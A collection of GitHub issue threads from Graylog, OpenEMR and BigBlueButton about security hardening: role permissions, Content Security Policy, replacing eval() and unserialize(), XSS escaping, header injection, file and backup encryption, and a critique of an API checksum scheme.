When a user is allocated to the Reader role, system information is available to the user via the System menu.

## Expected Behavior
<!--- If you're suggesting a change/improvement, tell us how it should work -->
When assigning the Reader role to a user, the expectation is that the user will not have access to the System menu and system information.

## Current Behavior
<!--- If suggesting a change/improvement, explain the difference from current behavior -->
When assigning a user to the Reader role, the user has access to the System menu and info about the cluster and its configuration.

## Possible Solution
<!--- Not obligatory, but suggest a fix/reason for the bug, -->
<!--- or ideas how to implement the addition or change -->
A potential solution to the problem is to have a role to define a user that only needs to see messages in their allocated streams, with no access to system related information.

## Steps to Reproduce (for bugs)
<!--- Provide a link to a live example or an unambiguous set of steps to -->
<!--- reproduce this bug. Include code to reproduce, if relevant -->
1. Create a user
2. Assign the user to the Reader role
3. Log in as the new user
4. The user has access to the System menu and system related information

## Context
<!--- How has this issue affected you? What are you trying to accomplish? -->
We are hosting a Graylog server which is used by multiple components as a centralized logging solution. An external company is hosting a system inside of our cluster, and are also writing messages to Graylog. We want to ensure the external company only has access to messages written by their application and no access to our own messages.

To achieve this we have set up a stream filtering based on the application parameter, and it works brilliantly.

However, when creating a new user for the external company and assigning the Reader role to the user, the external company's user has access to the System menu which is showing information about the installation we would rather not make publicly available.

<!--- Providing context helps us come up with a solution that is most useful in the real world -->
In a perfect world, the external user will only have access to the Streams, Alerts, and Dashboards menu and not the Systems menu at all

## Your Environment
<!--- Include as many relevant details about the environment you experienced the bug in -->

* Graylog Version: 2.4.0+2115a42
* Elasticsearch Version: Version: 5.6.5, Build: 6a37571/2017-12-04T07:50:10.466Z, JVM: 1.8.0_162
* MongoDB Version: db version v2.6.10
* Operating System: Ubuntu 16.04.3 LTS
* Browser version: Chrome
","Any news about this issue?Same expected behavior here. Are there any plans for adjusting the Reader role in the future?Same expected behavior here in Graylog 4.3.4 version =(

Can you change back to create Roles without System Permission Views? Or correct this.",no,"security,users,triaged,improvement,"
Graylog2/graylog2-server,1324134009,"Define and return Content Security Policy for Web Frontend and REST API","<!--- Provide a general summary of the issue in the Title above -->
## What?
<!--- Tell us how it should work. Providing more details will result in a better understanding of your needs/wishes -->

For all responses we return through the HTTP endpoint, we should return a content security policy consumed by the client. It should match the requirements for the REST API and the web frontend, which are both returned through the same endpoint.

## Why?
<!--- How has this issue affected you? What are you trying to accomplish? -->
<!--- Providing context helps us come up with a solution that is most useful in the real world -->

In order to limit the attack surface for common web attack vectors like XSS, click-jacking, code-injection etc. we should implement a principle of least privilege for the REST API and the web frontend. A content security policy can help with this by limiting the features (and their scope) the browser can use by defining what we expect the frontend to use.

## Notes

- We should ensure that we are not running without a CSP at all in development, because the assets are returned through a different endpoint
- The CSP implementation should incorporate and replace our feature for controlling the ability to embed the frontend (#13160)
- Incorporate disallowing `usafe-eval` as described in #9260",,no,"security,feature,triaged,"
openemr/openemr,386626306,"replace eval() for js files","<!-- Love openemr? Please consider supporting our collective:
👉  https://opencollective.com/openemr/donate -->

I believe this is the `eval()` described here: http://php.net/manual/en/function.eval.php

> The eval() language construct is very dangerous 

It is also risky for JS and I'll find a way to replace some of the instances I uncovered as well.","          
`interface/forms/fee_sheet/review/js`  (1 usage found)
                *** fee_sheet_core.js  (1 usage found)
                    69 eval(diags_matches[i]);
`interface/main/calendar/modules/PostCalendar/pnincludes`  (16 usages found)
                *** overlib.js  (8 usages found)
                    931 winoffset = (ie4) ? eval('o3_frame.'+docRoot+'.scrollLeft') : o3_frame.pageXOffset;
                    932 if (ie4) iwidth = eval('o3_frame.'+docRoot+'.clientWidth');
                    937 if ( (o3_x - winoffset) > ((eval(iwidth)) / 2)) {
                    951 if ( (eval(placeX) + eval(o3_width)) > (winoffset + iwidth) ) {
                    981 scrolloffset = (ie4) ? eval('o3_frame.'+docRoot+'.scrollTop') : o3_frame.pageYOffset;
                    985 if (ie4) iheight = eval('o3_frame.'+docRoot+'.clientHeight');
                    988 iheight = (eval(iheight)) / 2;
                    1035 if (ie5) {o3_x=eval('event.x+o3_frame.'+docRoot+'.scrollLeft'); o3_y=eval('event.y+o3_frame.'+docRoot+'.scrollTop');}
                *** overlib_mini.js (8 usages found)
                    575 winoffset=(ie4)? eval('oframe.'+docRoot+'.scrollLeft'): oframe.pageXOffset;
                    576 if(ie4)iwidth=eval('oframe.'+docRoot+'.clientWidth');
                    579 if((ox - winoffset)>((eval(iwidth))/ 2)){
                    591 if((eval(placeX)+ eval(owidth))>(winoffset + iwidth)){
                    613 scrolloffset=(ie4)? eval('oframe.'+docRoot+'.scrollTop'): oframe.pageYOffset;
                    615 if(ie4)iheight=eval('oframe.'+docRoot+'.clientHeight');
                    617 iheight=(eval(iheight))/ 2;
                    649 if(ie5){ox=eval('event.x+oframe.'+docRoot+'.scrollLeft');oy=eval('event.y+oframe.'+docRoot+'.scrollTop');}
`interface/modules/zend_modules/public/js/carecoordination`  (2 usages found)
                *** jquery-ui.custom.js  (1 usage found)
                    491 inlineSettings[attrName] = eval(attrValue);
                *** jquery.ui.datepicker.js  (1 usage found)
                    153 inlineSettings[attrName] = eval(attrValue);
`interface/modules/zend_modules/public/js/carecoordination/ui`  (1 usage found)
                *** jquery-ui.custom.js  (1 usage found)
                    6591 inlineSettings[attrName] = eval(attrValue);
`interface/modules/zend_modules/public/js/scripts`  (1 usage found)
                *** file_uploader.js  (1 usage found)
                    252 eval(success_function+""(""+data+"")"");
`library/js`  (6 usages found)
                *** CategoryTreeMenu.js (3 usages found)
                    317 eval(nodeObject.ontoggle);
                    321 eval(nodeObject.oncollapse);
                    323 eval(nodeObject.onexpand);
                *** DocumentTreeMenu.js`  (3 usages found)
                    310 eval(nodeObject.ontoggle);
                    314 eval(nodeObject.oncollapse);
                    316 eval(nodeObject.onexpand);@harshlele This will be another good issue for you when you're done with the other stuff. It's only 62 occurrence across 7 or 8 files.

1). it's quite important and I will be the best job reference you've ever for future employers if you fix this in a month or two 
2). Will be very good learning. This will require knowing how to fix old Javascript code, which is 100%  part of any job and updating it to whatever the latest and greatest is.
3). Feel free to just fix a few of the easier ones and pull request  and I'll still be the best job reference you've ever had, starting with Accenture India if you ever want to work there (my employer) :fireworks: Hmm i'm gonna be busy for next few days, so I'll start on this in the new year(also, I need to read a bit about eval haha)
(Also, about the reference,I'm most probably gonna do a masters, but I REALLY appreciate it :smile:)
hi @harshlele and @danehrlich1 ,

Lets do this one first :)
https://github.com/openemr/openemr/issues/2083

Now that @harshlele is a remove qtip expert, this would be a great step as we modernize (and secure) the codebase. And I promise this won't negatively effect @danehrlich1 's reference :)

-brady
remove qtip expert haha. But yeah ok it should be pretty easy. HAH just to be clear
1. Anything involving modernizing the codebase is EXACTLY the same as securing it so that's fine
2. Deleting / cleansing the old stuff, is also pretty much EXACTLY the same thing as increasing security

@harshlele That reference is good for many years in the future too since I know you're doing a Masters so keeping this in mind :) Also not sure how far you are from Bangalore but I worked at Oracle for 4 years, can also do them. Oracle's second largest office in the world is out of that city. ill start working on this from tomorrow now that the other issue is closed. But i'll be a bit busy because of college and other things, so i may take some time to fix this one.Outstanding harshele and no worries. Please also let me know if you have any questions about this issue or general development stuff.

I also need to send you a couple of resources that will exponentially increase your learning.

Take a look at this PDF for now: https://legacy.gitbook.com/download/pdf/book/frontendmasters/front-end-developer-handbook-2018

It’s 168 pages, and don’t have to read every single word, but man you should really skim this. Gives you great overview. I could have saved a year of study with this.


> On Jan 5, 2019, at 10:41 AM, harshlele <notifications@github.com> wrote:
> 
> ill start working on this from tomorrow now that the other issue is closed. But i'll be a bit busy because of college and other things, so i may take some time to fix this one.
> 
> —
> You are receiving this because you were mentioned.
> Reply to this email directly, view it on GitHub, or mute the thread.
Haha Thanks I'll check it out!@joshuaaguilar20 Also note this pull request: https://github.com/openemr/openemr/pull/2118@joshuaaguilar20 do this@bradymiller @danehrlich1  has this been resolved?still an issue",no,"Security,JS,"
openemr/openemr,401151836,"Harden against XSS ","<!-- Love openemr? Please consider supporting our collective:
👉  https://opencollective.com/openemr/donate -->

Perfectly hardened example script: https://github.com/openemr/openemr/blob/master/interface/reports/pat_ledger.php

Hardens text - text():
https://github.com/openemr/openemr/blob/master/interface/reports/pat_ledger.php#L680

Hardens code in html tags / attributes - attr():
https://github.com/openemr/openemr/blob/master/interface/reports/pat_ledger.php#L824

Hardens code in text that also is language / location specific - xlt():
https://github.com/openemr/openemr/blob/master/interface/reports/pat_ledger.php#L758

Hardens code in html tags / attributes that also is language / location specific - xla():
https://github.com/openemr/openemr/blob/master/interface/reports/pat_ledger.php#L581

Unknown - js_escape():
https://github.com/openemr/openemr/blob/master/interface/reports/pat_ledger.php#L945

Unknown - xlj():
https://github.com/openemr/openemr/blob/master/interface/reports/pat_ledger.php#L383

Here's the documentation that covers this:
https://www.open-emr.org/wiki/index.php/Codebase_Security#Cross-Scripting_Prevention

Here's the library with these functions:
https://github.com/openemr/openemr/blob/master/library/htmlspecialchars.inc.php","@morg0n This is going to be a better issue / perfect difficulty level for you later on for sure. Need to talk with Brady and give better instructions, but it's about sanitizing code to protect against XSS attacks. There is tons of work here so probably will split this up into at least 5 issues to give them to different people.

For now would just study XSS attacks it's the ultimate security / cyber  thing to know...If anybody has interest in this, just let me know, and I'll direct you to some scripts to work on. This is actually a really good way to quickly become a effective ""code reviewer"" since many of the corrections in the code reviews I do involve these functions to prevent cross scripting (XSS) attacks.Hi. I am interested.hi @flockclock ,
See here for a good issue to start on this:
https://github.com/openemr/openemr/issues/2157Hello @bradymiller.  I could work on these issues too.  Thanks!  hi @david-vu ,
See here for a good issue to start on this:
https://github.com/openemr/openemr/issues/2161Good additional instructions and examples: https://github.com/openemr/openemr/issues/2169#issuecomment-460129695@danehrlich1 do I have enough battle XP for this one yet?@bradymiller @morg0n This is a good one. Did we put enough instructions? I can't remember if we detailed the how-to for ppl on how to do this...hi @morg0n , @danehrlich1 , We are running low on places that need XSS fixes. Let me see if I can find any.@bradymiller Yeah that's what I'm thinking and I just mentioned in another comment.",no,"Security,"
openemr/openemr,683340720,"Accounting account can upload file as Admin account","I just discovered a vulnerability that allows an **accounting** account to upload files like an **admin** account
POC: https://drive.google.com/file/d/1uMVhHLkvf5bdAt0__vq8wG1hcHAaHALy/view?usp=sharing
If you need any further information don't hesitate to email me: nguyenkhanh.actvn@gmail.com","Hi @khanhnv-2091,
I tried to replicate the steps from the video but I see OpenEMR is completely different now.
There is no an **accounting** account (now it's called **accountant**).

@tywrenn I think the issue could be closed
@sjpadgett Can u help me verify that this issue was fixed? I've been working a full-time job and barely have spare time on this nowadays lol",no,"Bug,Security,"
openemr/openemr,1294964929,"Bump jquery-validation from 1.19.4 to 1.19.5","Bumps [jquery-validation](https://github.com/jquery-validation/jquery-validation) from 1.19.4 to 1.19.5.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/jquery-validation/jquery-validation/releases"">jquery-validation's releases</a>.</em></p>
<blockquote>
<h1>1.19.5 / 2022-07-01</h1>
<h2>Chore</h2>
<ul>
<li>Add CodeQL analysis <a href=""https://github.com/jquery-validation/jquery-validation/commit/3d3c1fb880c3c623da334e9b6b32a861a16efeb8"">3d3c1fb</a></li>
</ul>
<h2>Core</h2>
<ul>
<li>Fixed jQuery .submit() event shorthand deprecation notice <a href=""https://github-redirect.dependabot.com/jquery-validation/jquery-validation/pull/2430"">#2430</a></li>
<li>Fixed ReDos vulnerability in url, and url2 validation <a href=""https://github.com/jquery-validation/jquery-validation/commit/5bbd80d27fc6b607d2f7f106c89522051a9fb0dd"">5bbd80d</a></li>
</ul>
<h2>Localisation</h2>
<ul>
<li>Added periods to messages <a href=""https://github-redirect.dependabot.com/jquery-validation/jquery-validation/pull/2266"">#2266</a></li>
</ul>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/jquery-validation/jquery-validation/blob/master/changelog.md"">jquery-validation's changelog</a>.</em></p>
<blockquote>
<h1>1.19.5 / 2022-07-01</h1>
<h2>Chore</h2>
<ul>
<li>Add CodeQL analysis <a href=""https://github.com/jquery-validation/jquery-validation/commit/3d3c1fb880c3c623da334e9b6b32a861a16efeb8"">3d3c1fb</a></li>
</ul>
<h2>Core</h2>
<ul>
<li>Fixed jQuery .submit() event shorthand deprecation notice <a href=""https://github-redirect.dependabot.com/jquery-validation/jquery-validation/pull/2430"">#2430</a></li>
<li>Fixed ReDos vulnerability in url, and url2 validation <a href=""https://github.com/jquery-validation/jquery-validation/commit/5bbd80d27fc6b607d2f7f106c89522051a9fb0dd"">5bbd80d</a></li>
</ul>
<h2>Localisation</h2>
<ul>
<li>Added periods to messages <a href=""https://github-redirect.dependabot.com/jquery-validation/jquery-validation/pull/2266"">#2266</a></li>
</ul>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/jquery-validation/jquery-validation/commit/5907740ce2492338606dbbdbd13d244a8d545097""><code>5907740</code></a> 1.19.5</li>
<li><a href=""https://github.com/jquery-validation/jquery-validation/commit/5bbd80d27fc6b607d2f7f106c89522051a9fb0dd""><code>5bbd80d</code></a> Merge pull request from GHSA-ffmh-x56j-9rc3</li>
<li><a href=""https://github.com/jquery-validation/jquery-validation/commit/3d3c1fb880c3c623da334e9b6b32a861a16efeb8""><code>3d3c1fb</code></a> Chore: Add CodeQL analysis</li>
<li><a href=""https://github.com/jquery-validation/jquery-validation/commit/0da490675cdc1d1ce0b6644c3f4ad14023d53238""><code>0da4906</code></a> Core: fix deprecated jquery .submit() event shorthand (<a href=""https://github-redirect.dependabot.com/jquery-validation/jquery-validation/issues/2430"">#2430</a>)</li>
<li><a href=""https://github.com/jquery-validation/jquery-validation/commit/1b79877af768ceaa0901dbcbda366bb27124989b""><code>1b79877</code></a> Localization: Add periods to messages (<a href=""https://github-redirect.dependabot.com/jquery-validation/jquery-validation/issues/2266"">#2266</a>)</li>
<li><a href=""https://github.com/jquery-validation/jquery-validation/commit/b68e282cc4e4e1bc34805f9f2383562e3c4dcc4b""><code>b68e282</code></a> Chore: update changelog</li>
<li><a href=""https://github.com/jquery-validation/jquery-validation/commit/3a4cd948d18cd157f9b743b80735335a5cf852e7""><code>3a4cd94</code></a> Build: Updating the master version to 1.19.5-pre.</li>
<li>See full diff in <a href=""https://github.com/jquery-validation/jquery-validation/compare/1.19.4...1.19.5"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=jquery-validation&package-manager=npm_and_yarn&previous-version=1.19.4&new-version=1.19.5)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language

You can disable automated security fix PRs for this repo from the [Security Alerts page](https://github.com/openemr/openemr/network/alerts).

</details>","@dependabot rebase@bradymiller This has 100% compatibility with existing code. This patches a vulnerability in jquery-validation that should be merged in quickly.hi tywrenn , planning a version update sweep in js/php packages after get the drop for php 7.4 PR straightened up.",yes,"Security,dependencies,javascript,"
openemr/openemr,382532439,"analyze (and possibly replace) each unserialize() call","`unserialize()` is a problematic PHP function with quite a few exploits.

I believe the ""ideal"" solution is using JSON instead, but as long as we sanitize what is being passed to `unserialize()` and use the additional parameters we can call in the function we should be good.

https://paragonie.com/blog/2016/04/securely-implementing-de-serialization-in-php","working on fix here:
https://github.com/openemr/openemr/pull/2457Committed a medium term fix here:
https://github.com/openemr/openemr/pull/2457

Plan a longer term fix where look at each use case and convert it to something else (if it makes sense to change it to something else).",no,"Security,"
openemr/openemr,429127428,"Prevent header injection","See here for details:
https://www.open-emr.org/wiki/index.php/Codebase_Security#Header_Sanitation

First item for somebody is to research this and figure out best mechanism to escape stuff that goes into header.","@bradymiller I have been researching on this and I saw something on stackoverflow that might come in handy https://stackoverflow.com/questions/31318151/how-to-prevent-crlf-injection-http-response-splitting-in-php Am also trying to get a hands on experience with pen testing to see where and how I can see this vulnerability in action first hand on the OpenEMR app",no,"Security,"
openemr/openemr,388523390,"encrypt backups ","<!-- Love openemr? Please consider supporting our collective:
👉  https://opencollective.com/openemr/donate -->

Raif requested this feature. Should be easy to do. PHP now has LibSodium as part of it, which is amazing encryption library. ","I can get started on this within the next few days!THANK YOU!

Lmk if you need anything. I’m trying to give ppl working on these issues a 4 hour SLA response time on help they need to keep up the pace of work. 

Also you definitely are near the top-level of new contributors now, again thanks :)

> On Jan 17, 2019, at 5:59 PM, morg0n <notifications@github.com> wrote:
> 
> I can get started on this within the next few days!
> 
> —
> You are receiving this because you were assigned.
> Reply to this email directly, view it on GitHub, or mute the thread.
hi @morg0n and @danehrlich1 ,
Very exciting to see folks working on encryption stuff. Note LibSodium is not yet supported in OpenEMR (need to wait until support for php 7.1 drops in about a year), but we have a very nice set of encrypt/decrypt functions:
https://github.com/openemr/openemr/blob/master/library/crypto.php
(they are built in a future proof fashion where we will be able to substitute Libsodium stuff in a year)@bradymiller 

1. Can the functions above have a file like a big zip or something passed to them as a parameter (not just a string)?
2. The above library would allow us to have a user import the encrypted backup into another instance of OpenEMR knowing ONLY the encryption password right? No secret key is also required for the user to load in when decrypting?

@morg0n if the answers to these 2 things are ""yes"" then you should be able to get it all done using the functions in that file. Should be medium difficulty to figure out.

In the part of OpenEMR where the user initiates a backup, add a checkbox to say whether the user wants to encrypt the file. If that box is checked, then a password field should appear where they enter the secret key. The secret key should be minimum 18 characters to encourage use of Passphrases: https://en.wikipedia.org/wiki/Passphrasehi @morg0n and @danehrlich1 ,

The current functions take the raw data (ie. not a file). Which works well when encrypting standard files. But agree there could be issues when encrypting large backup files(for now could just feed the whole file like do when encrypting patient files and see what happens :) ). When doing the encryption also agree important to think about just using a password(key is created from the password) as is used in the method where a user can download an encrypted patient file in OpenEMR (this is what the second parameter is used for in encryptStandard/decryptStandard function; I do wonder how secure this mechanism is though, since it is basically turning the password into a key (https://github.com/openemr/openemr/blob/master/library/crypto.php#L99-L103), and is something we should research; sounds like requiring at least 18 characters is a good start though); in this case a user can decrypt the file in any OpenEMR instance as long as they have the password (https://github.com/openemr/openemr/blob/master/library/crypto.php#L157-L161).

-bradyBrady:

The only other way I can think of is via the GPG utility in Linux. It’s pretty straight forward and easy to use. We could also generate a random 4 word pass phrase for user like “dante-bastion-summer-strangest” for a pretty strong passphrase so they don’t even have to think of one.

QUESTION: is there a secure way for OpenEMR to invoke a bash script (.sh file) that would do all this? If not this idea is dumb and please ignore :)


> On Jan 21, 2019, at 2:42 AM, Brady Miller <notifications@github.com> wrote:
> 
> hi @morg0n ,
> 
> The current functions take the raw data (ie. not a file). Which works well when encrypting standard files. But agree there could be issues when encrypting large backup files(for now could just feed the whole file like do when encrypting patient files and see what happens :) ). When doing the encryption also agree important to think about just using a password(key is created from the password) as is used in the method where a user can download an encrypted patient file in OpenEMR (this is what the second parameter is used for in encryptStandard/decryptStandard function; I do wonder how secure this mechanism is though, since it is basically turning the password into a key(https://github.com/openemr/openemr/blob/master/library/crypto.php#L99-L103), and is something we should research; sounds like requiring at least 18 characters is a good start though); in this case a user can decrypt the file in any OpenEMR instance as long as they have the password.
> 
> -brady
> 
> —
> You are receiving this because you were mentioned.
> Reply to this email directly, view it on GitHub, or mute the thread.
btw,
Regarding the passphrase to key/hmac issue, found this related discussion:
https://crypto.stackexchange.com/questions/6459/deriving-hmac-key-and-cipher-key-from-passphraseHi all!  Looking back on this issue - so as the functions take raw data, the introduction of a zip file as a parameter /wouldn't/ work then, right (because it wouldn't be efficacious for those bigger backup files)?  Trying to figure out where this landed as far as how I ought to move forward with it :) not sure if I came to the right conclusion therehi @morg0n ,
There are 3 main issues here:
1. Passphrase encryption. We have solved this now in the codebase (https://github.com/openemr/openemr/issues/2196), so can check that off the list.
2. Encrypting large files. Not solved. I think would need to look into how to encrypt a stream rather than a full file; this may not be too tough.
3. Decryption mechanism. Now a person downloads a backup file, which they then use in a separate restore process (either a bash script or manually opening the zip and restoring the path and the databases manually). So, would need to have a mechanism where one could decrypt the backup and not sure how/where best to do that.hi @morg0n ,
To further expand on this. I would take the following approach.

First. Add 2 functions to the current API that does encryption and decryption. See this class to get an idea how encryption/decryption is done (https://github.com/openemr/openemr/blob/master/src/Common/Crypto/CryptoGen.php#L5-L17). Will basically be a POST api call that will have `passphrase` parameter to hold the password (when using password) or a `keyStore` parameter to be either `drive` or `database` (when using the private keys). Once this is supported, then there is now a way for the encrypted database backup file to be decrypted. Just take a look at the code for now at the crypto function and look around and test the API. Then we can press ahead on the development.

Second. Add encryption support for the backup, which will entail us researching most secure way to support encryption/decryption of php streams.

-brady",no,"Security,Hardening,help wanted,"
openemr/openemr,388597816,"Secure File Upload","<!-- Love openemr? Please consider supporting our collective:
👉  https://opencollective.com/openemr/donate -->

Should be straight forward","Hello @danehrlich1 where do you want this issue fixed?",no,"Security,help wanted,"
openemr/openemr,406244057,"Encrypt and secure all files that are stored within OpenEMR on drive","**Item 1.** Encryption of files stored on drive:
~~1. build out current encryption to create/store keys in a new sql table (we currently have a mechanism that stores keys on the drive to encrypt stuff in database, so just need to leverage that a little bit).~~(COMPLETED)
~~2. encrypt/decrypt the billing log as proof of concept~~(COMPLETED)
~~3. then create encrypt/decrypt mechanism for patient documents module~~(COMPLETED)
~~4. encrypt/decrypt mechanism for patient letters module~~ (COMPLETED)
~~5. document templates~~ (COMPLETED)
~~6. couchdb log~~ (COMPLETED)
~~7. API for documents needs to be revised to leverage current documents mechanism~~ (COMPLETED)
8. interface/fax/fax_dispatch.php (needs analysis)
9. education stuff if possible (needs analysis)
10. edi stuff if possible (needs analysis)
11. era stuff if possible (needs analysis)
12. procedure_results stuff if possible (needs analysis)
13. more miscellaneous stuff

~~**Item 2.** Folding all the writable directories into the documents directory, which would make installation and security of openemr markedly improved(also opens the door to support placing the data stored on drive to be migrated outside the web directory):
#572
#673
(note these are going to be very extensive changes since it will also involve upgrading changes and project infrastructure changes)
#2254~~ (COMPLETED)


~~**Item 3.** Ensuring setup checks write permissions on all subdirectories in documents subdirectories (vital to ensure openemr encryption will work):
#2206~~ (COMPLETED)

~~**Item 4.** Answer the question if we really need to support smarty caching? Meaning, is it really optimizing anything significant? If not, then removing caching would markedly simplify things.(answer is that we need to have a writable smarty compile directory, but do not need a cache directory since we are not using that anyways; dealt with this item here: https://github.com/openemr/openemr/pull/2253 )~~ (COMPLETED)

~~**Item 5.** Considering storing documents on drive as uuid rather than the name of the file (name is lightweight and would be stored in the documents sql entry).~~ (COMPLETED)

**Item 6.** Full support for couchb (option to store all files, with some exceptions, on couchdb rather than filesystem; currently only support patient documents and ccda thingy).
~~1.Also give option to encrypt this (just like encrypt stuff on the drive), which will also be on by default~~ (COMPLETED)

**Item 7.** Allow migration of the documents directory outside web path.","Note I am jump starting this project a bit (did steps 1-2) in the following PR:
https://github.com/openemr/openemr/pull/2211Steps 1 and 2 are completed. Here are 2 additional projects that can now be worked on:

1. Encrypt/decrypt the letters module files that are stored on drive (small project)

2. Encrypt/decrypt the documents module files that are stored on drive (large project)

If anybody has interest in these projects, just let me know and then I'll create an issue with more information/guidance on getting started.
@bradymiller  I would love to work on this, you can create the issue with more information/guidance on getting started
@bradymiller Can you provide @prondubuisi with links to the ""patient letters module"" and the ""patient documents module"". I don't even know where these are in the codebase sadly.

Also please provide a link to the proof of concept file you did.hi @prondubuisi and @danehrlich1 ,

For proof of concept, see the current example where doing encryption of the billing log that is stored on drive.
The encryption is here: https://github.com/openemr/openemr/blob/master/interface/billing/billing_process.php#L310-L315
And the decryptions are here:
https://github.com/openemr/openemr/blob/master/interface/billing/billing_process.php#L158-L161
https://github.com/openemr/openemr/blob/master/interface/billing/customize_log.php#L19-L23

Lets work on the letter module first.
The patient letter module can be seen in OpenEMR. Open a patient, and then in top menu go to popups->Letter. This script is at https://github.com/openemr/openemr/blob/master/interface/patient_file/letter.php . Recommend reading through the script to see how it writes to the drive. Goal it to encrypt it when write it to the drive and decrypt when read it from the drive.

-bradyHello @bradymiller I am working on this but I can't see any new letters in the folder, am guessing its ubuntu permission errors, How can i turn on error reporting, I installed Openemr using docker and I see plenty php.ini files for different PHP version folders in the dockers folderhi @prondubuisi , very nice to see you working on this. pretty excited about this issue. Within the docker, the log will be at /var/log/apache2/error.log . Let us know if you need guidance on how to get into the docker. -brady@bradmiller I can't see any /var folder, at least not in the root directory. How do I access it?what do you see when do:
```
docker ps -a
```@prondubuisi , forgot to flag you on my post aboveokay @bradymiller this is what I see from the command https://pastebin.com/M191WDvchi @prondubuisi ,
To go into the docker, try:
```
docker exec -it openemr_openemr_1 sh
```
then in the docker, try:
```
cat /var/log/apache2/error.log
```just placed PR proof of concept for encryption of patient documents here:
https://github.com/openemr/openemr/pull/2238

@prondubuisi , let me know if need more guidance on the letters stuffdocument module now supports encryption on drive: https://github.com/openemr/openemr/commit/a960ad8867dc0b6f23aa1a9fe323b06403e1ffb9@bradymiller Frankly am completely lost with how to get started with this task. I am willing to follow through if I get any directives
hi @prondubuisi ,
Yep, looked through that script and is complicated. Let me see if can provide more specific directives; there's a risk I may end up completing it while figuring it out :) (don't worry, though, there are more places where we will need to support encrypt/decrypt on the drive :) ) -bradyyep, ended up being complicated but at the same time just requiring a couple lines of code. Here's the code:
https://github.com/openemr/openemr/issues/2181
I'm gonna start to a list of other miscellaneous stuff on the top post in this PR to track progress. Guessing there will be up to 10 items or so to do that folks will be able to work on.In terms of security of things stored on drive, also several related projects that are important:

1. Folding all the writable directories into the documents directory, which would make installation and security of openemr marked improved(also opens the door to support placing the data stored on drive to be migrated outside the web directory):
https://github.com/openemr/openemr/issues/572
https://github.com/openemr/openemr/pull/673
(note these are going to be very extensive changes since it will also involve upgrading changes and project infrastructure changes)

2. Ensuring setup checks write permissions on all subdirectories in documents subdirectories (vital to ensure openemr actually will work):
https://github.com/openemr/openemr/issues/2206

(hopefully will be able to break this project down into bite sized issues; still analyzing)
PR for ""Folding all the writable directories into the documents directory"" is here: https://github.com/openemr/openemr/pull/2254The critical pieces are completed and can work on the rest for future 5.0.3 release (so changed milestone tag from 5.0.2 to 5.0.3).hi @stephenwaite , Here's the related issue (encrypted stuff in documents drive) that we discussed on the call Saturday :)",no,"Security,Hardening,"
bigbluebutton/bigbluebutton,100486838,"API security model","Originally reported on Google Code with ID 994

```
A suggestion from the bigbluebutton-dev list from Steve Clay for the API security model:

* SHA1(msg + key) is not a well-trusted mechanism for generating MACs. If the API is
ever redesigned, HMAC [1] is the standard to use:

 checksum = HMAC_SHA1(callName + queryString, siteKey)

...but I'd also recommend the caller send a unique key for every message, derived from
something like PBKDF2 [2]. E.g.:

 # create random salt
 salt = 8 or more random alpha-numeric chars

 # derive a key from salt and siteKey
 DK = PBKDF2(PRF = HMAC_SHA1, P = siteKey,
             S = salt, c = 1000, dkLen = 8 bytes)

 # create MAC from DK
 MAC = HMAC_SHA1(callName + queryString, DK)

 # request would be
 api/callName?[querystring]&salt=[salt]&checksum=[MAC]

Even using the siteKey as DK in the HMAC function would be an improvement if PBKDF2
seems onerous for end users, but it'd be better to offer client-friendly implementations
of this rather than dumb the security down.

* Potentially confusing terms:
 * BBB's ""security salt"" is actually a key. Cryptographic salts are often not considered
secret, and even transmitted in cleartext, so semantics is probably worth getting right
in this case.
 * Similarly, the attendee and moderator ""passwords"" are just tokens; not unique per
user nor kept very secret (one is leaked to every user invited it). Not a big deal,
but confusing for the API end user.

* Since the getMeetings call is of a known format (only the checksum is unknown), it
would be trivial to generate a brute force mechanism to try different keys against
it. You could consider adding a slight delay to these responses...

[1] http://en.wikipedia.org/wiki/HMAC#Design_principles
[2] http://en.wikipedia.org/wiki/PBKDF2

Message in: http://groups.google.com/group/bigbluebutton-dev/browse_thread/thread/76839dca38d0fc2a
```

Reported by `mcmarkos86` on 2011-09-12 21:08:36
","```
There's more issues with the current authentication scheme. The current security model
is open for replay attacks  as a signed URL does not contain a timestamp or expiry
information. So if I ever lay my hands on a signed ""create meeting"" url it's mine forever
and cannot be revoked short of replacing the sitekey.

On the other hand I don't think it's necessary to add PBKDF2 to the security model.
Any potential attacker does not need the original key to generate valid HMAC-Signatures,
computing the DK would be sufficient. Adding a nonce that makes each request unique
would have a better effect.

I have an HMAC authentication scheme for ruby, the spec is contained in the readme
document here https://github.com/Asquera/warden-hmac-authentication. The scheme used
is close to the scheme that Amazon uses in the S3 authentication scheme. (feedback
appreciated)


```

Reported by `felix.gilcher@asquera.de` on 2011-09-19 13:35:41
Reported by `ffdixon` on 2011-10-07 11:56:58
- **Labels added**: Security
```
We should revisit these suggestions before the 1.0 release
```

Reported by `ffdixon` on 2012-06-24 17:57:40
